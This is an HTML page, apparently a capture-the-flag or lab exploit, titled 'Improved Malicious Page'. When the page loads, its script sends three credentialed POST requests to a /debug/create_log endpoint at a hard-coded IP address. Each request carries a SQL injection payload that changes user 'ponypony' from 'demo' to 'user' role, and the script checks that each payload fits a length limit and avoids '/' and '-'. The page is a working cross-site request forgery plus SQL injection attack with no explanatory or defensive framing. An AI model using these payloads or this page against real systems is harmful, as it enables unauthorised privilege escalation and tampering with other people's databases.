<!DOCTYPE html>
<html>

<head>
    <title>Improved Malicious Page</title>
</head>

<body>
    <h1>Testing Page</h1>
    <p>Executing improved payload...</p>

    <script>
        // Direct fetch to exploit the SQL injection in /debug/create_log
        // This will update user ID 3 (ponypony) from 'demo' to 'user' role

        // Option 1: Target by ID
        const payload1 = "');UPDATE users SET role='user' WHERE id=3;/*";

        fetch('http://91.107.176.228:3000/debug/create_log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'log=' + encodeURIComponent(payload1),
            credentials: 'include'
        })
            .then(response => {
                console.log('Response status:', response.status);
                console.log('Response ok:', response.ok);
                return response.text();
            })
            .then(text => {
                console.log('Response text:', text);
            })
            .catch(error => {
                console.error('Error:', error);
            });

        // Option 2: Target by username (alternative)
        const payload2 = "');UPDATE users SET role='user' WHERE username='ponypony';/*";

        fetch('http://91.107.176.228:3000/debug/create_log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'log=' + encodeURIComponent(payload2),
            credentials: 'include'
        })
            .then(response => {
                console.log('Alt Response status:', response.status);
                console.log('Alt Response ok:', response.ok);
                return response.text();
            })
            .then(text => {
                console.log('Alt Response text:', text);
            })
            .catch(error => {
                console.error('Alt Error:', error);
            });

        // Option 3: Shorter payload to fit constraints better
        const payload3 = "');UPDATE users SET role='user' WHERE id=3;";

        fetch('http://91.107.176.228:3000/debug/create_log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'log=' + encodeURIComponent(payload3),
            credentials: 'include'
        })
            .then(response => {
                console.log('Short Response status:', response.status);
                return response.text();
            })
            .then(text => {
                console.log('Short Response text:', text);
            });

        // Check payload lengths (must be <= 50 chars and no / or -)
        console.log('Payload 1 length:', payload1.length);
        console.log('Payload 2 length:', payload2.length);
        console.log('Payload 3 length:', payload3.length);
        console.log('Payload 1 contains / or -:', /[\/\-]/.test(payload1));
        console.log('Payload 2 contains / or -:', /[\/\-]/.test(payload2));
        console.log('Payload 3 contains / or -:', /[\/\-]/.test(payload3));
    </script>
</body>

</html>